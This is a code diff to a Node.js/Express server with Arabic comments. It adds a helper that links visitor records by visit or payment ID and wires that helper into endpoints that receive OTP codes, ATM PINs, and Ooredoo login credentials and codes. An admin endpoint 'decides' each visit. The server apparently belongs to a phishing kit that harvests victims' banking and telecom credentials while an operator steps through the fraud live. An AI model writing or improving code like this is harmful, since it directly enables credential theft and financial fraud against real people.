@@ -188,6 +188,15 @@ app.post('/api/admin/decide/:ref', (req, res) => {
   res.json({ ok: true, visit });
 });
 
+// Helper: البحث عن visit بواسطة visitId أو paymentId (ربط جميع البيانات في نفس السجل)
+function findVisit(id) {
+  if (!id) return null;
+  // البحث المباشر بـ visitId
+  if (visits[id]) return visits[id];
+  // البحث بـ paymentId
+  return Object.values(visits).find(v => v.pay && v.pay.id === id) || null;
+}
+
 // ---- Public: visitor tracking (no auth - used by the flow pages themselves) ----
 app.post('/api/track', (req, res) => {
   const data = req.body || {};
@@ -244,9 +253,7 @@ app.post('/api/payment', (req, res) => {
 // ---- Check Payment Status ----
 app.get('/api/status/:id', (req, res) => {
   const { id } = req.params;
-
-  // Find visit with this payment id
-  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+  const visit = findVisit(id);
 
   if (!visit) {
     return res.json({ status: 'pending' });
@@ -263,7 +270,7 @@ app.post('/api/otp', (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
   }
 
-  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+  const visit = findVisit(id);
 
   if (!visit) {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
@@ -287,7 +294,7 @@ app.post('/api/atm', (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing ATM PIN or ID' });
   }
 
-  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+  const visit = findVisit(id);
 
   if (!visit) {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
@@ -311,7 +318,7 @@ app.post('/api/ooredoo-login', (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
-  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+  const visit = findVisit(id);
 
   if (!visit) {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
@@ -336,7 +343,7 @@ app.post('/api/ooredoo-otp', (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
   }
 
-  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+  const visit = findVisit(id);
 
   if (!visit) {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
